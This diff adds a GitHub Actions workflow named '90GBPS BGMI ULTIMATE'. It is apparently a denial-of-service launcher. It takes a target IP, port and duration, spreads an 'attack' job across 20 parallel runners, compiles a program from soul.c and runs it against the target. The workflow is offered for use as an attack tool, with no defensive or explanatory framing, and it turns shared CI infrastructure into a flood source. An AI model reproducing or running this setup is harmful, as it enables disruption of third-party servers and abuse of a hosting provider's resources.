@@ -1,0 +1,28 @@
+name: 90GBPS BGMI ULTIMATE
+
+on:
+  workflow_dispatch:
+    inputs:
+      ip:
+        description: 'Target IP'
+        required: true
+      port:
+        description: 'Target Port'
+        required: true
+        default: '80'
+      time:
+        description: 'Duration (seconds)'
+        required: true
+        default: '60'
+
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        runner: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    steps:
+      - uses: actions/checkout@v4
+      - run: gcc -o soul soul.c -O3 -pthread -s
+      - run: ./soul ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }}
